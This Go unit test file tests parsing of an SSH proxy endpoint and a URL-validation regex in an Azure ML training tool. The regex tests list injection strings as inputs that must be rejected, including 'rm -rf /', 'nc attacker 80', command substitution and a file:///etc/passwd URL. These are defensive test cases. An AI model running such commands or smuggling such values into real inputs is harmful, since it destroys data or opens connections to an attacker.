// Copyright (c) Microsoft Corporation. All rights reserved.
// Licensed under the MIT License.

package cmd

import (
	"strings"
	"testing"

	"azure.ai.training/pkg/models"
)

func TestResolveSSHProxyEndpoint(t *testing.T) {
	const wantURL = "wss://ssh-abc.eastus2euap.nodes.azureml.ms"

	tests := []struct {
		name        string
		instance    *models.ServiceInstance
		wantErrPart string // substring expected in the error; empty means success
		wantURL     string
	}{
		{
			name:        "nil instance",
			instance:    nil,
			wantErrPart: "does not have services",
		},
		{
			name:        "empty instances map",
			instance:    &models.ServiceInstance{Instances: map[string]models.ServiceInstanceDetail{}},
			wantErrPart: "does not have services",
		},
		{
			name: "no SSH service in instances",
			instance: &models.ServiceInstance{
				Instances: map[string]models.ServiceInstanceDetail{
					"Tracking": {Type: "Tracking", Status: "Running"},
				},
			},
			wantErrPart: "is ssh enabled",
		},
		{
			name: "SSH present but not Running",
			instance: &models.ServiceInstance{
				Instances: map[string]models.ServiceInstanceDetail{
					"my_ssh": {Type: "SSH", Status: "NotStarted"},
				},
			},
			wantErrPart: "'NotStarted'",
		},
		{
			name: "SSH Running but Properties nil",
			instance: &models.ServiceInstance{
				Instances: map[string]models.ServiceInstanceDetail{
					"my_ssh": {Type: "SSH", Status: "Running"},
				},
			},
			wantErrPart: "missing ProxyEndpoint",
		},
		{
			name: "SSH Running but no ProxyEndpoint key",
			instance: &models.ServiceInstance{
				Instances: map[string]models.ServiceInstanceDetail{
					"my_ssh": {
						Type:       "SSH",
						Status:     "Running",
						Properties: map[string]any{"OtherKey": "x"},
					},
				},
			},
			wantErrPart: "missing ProxyEndpoint",
		},
		{
			name: "SSH Running but ProxyEndpoint is non-string",
			instance: &models.ServiceInstance{
				Instances: map[string]models.ServiceInstanceDetail{
					"my_ssh": {
						Type:       "SSH",
						Status:     "Running",
						Properties: map[string]any{"ProxyEndpoint": 42},
					},
				},
			},
			wantErrPart: "missing ProxyEndpoint",
		},
		{
			name: "SSH Running but ProxyEndpoint is empty string",
			instance: &models.ServiceInstance{
				Instances: map[string]models.ServiceInstanceDetail{
					"my_ssh": {
						Type:       "SSH",
						Status:     "Running",
						Properties: map[string]any{"ProxyEndpoint": ""},
					},
				},
			},
			wantErrPart: "missing ProxyEndpoint",
		},
		{
			name: "happy path",
			instance: &models.ServiceInstance{
				Instances: map[string]models.ServiceInstanceDetail{
					"my_ssh": {
						Type:       "SSH",
						Status:     "Running",
						Properties: map[string]any{"ProxyEndpoint": wantURL},
					},
				},
			},
			wantURL: wantURL,
		},
		{
			name: "happy path with non-SSH services also present",
			instance: &models.ServiceInstance{
				Instances: map[string]models.ServiceInstanceDetail{
					"Tracking": {Type: "Tracking", Status: "Running"},
					"my_ssh": {
						Type:       "SSH",
						Status:     "Running",
						Properties: map[string]any{"ProxyEndpoint": wantURL},
					},
				},
			},
			wantURL: wantURL,
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			got, err := resolveSSHProxyEndpoint(tc.instance, 0)
			if tc.wantErrPart != "" {
				if err == nil {
					t.Fatalf("expected error containing %q, got nil (url=%q)", tc.wantErrPart, got)
				}
				if !strings.Contains(err.Error(), tc.wantErrPart) {
					t.Fatalf("expected error to contain %q, got: %v", tc.wantErrPart, err)
				}
				return
			}
			if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}
			if got != tc.wantURL {
				t.Fatalf("url mismatch: want %q, got %q", tc.wantURL, got)
			}
		})
	}
}

func TestProxyEndpointPattern(t *testing.T) {
	tests := []struct {
		name  string
		input string
		want  bool
	}{
		// Valid
		{"wss valid", "wss://ssh-abc.eastus2euap.nodes.azureml.ms", true},
		{"https valid", "https://ssh-abc.eastus2euap.nodes.azureml.ms", true},
		{"ws valid", "ws://localhost:8080", true},
		{"http valid", "http://localhost:8080", true},
		{"with query", "wss://host/path?foo=bar", true},

		// Invalid - shell metachars (the whole point of the regex)
		{"semicolon injection", "wss://host;rm -rf /", false},
		{"ampersand injection", "wss://host&calc.exe", false},
		{"backtick injection", "wss://host`whoami`", false},
		{"dollar injection", "wss://host$(whoami)", false},
		{"pipe injection", "wss://host|nc attacker 80", false},
		{"newline injection", "wss://host\nrm -rf /", false},
		{"space injection", "wss://host evil", false},
		{"quote injection", "wss://host\"evil", false},

		// Invalid - bad scheme
		{"no scheme", "ssh-abc.azureml.ms", false},
		{"file scheme", "file:///etc/passwd", false},
		{"empty", "", false},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			got := proxyEndpointPattern.MatchString(tc.input)
			if got != tc.want {
				t.Fatalf("MatchString(%q) = %v, want %v", tc.input, got, tc.want)
			}
		})
	}
}
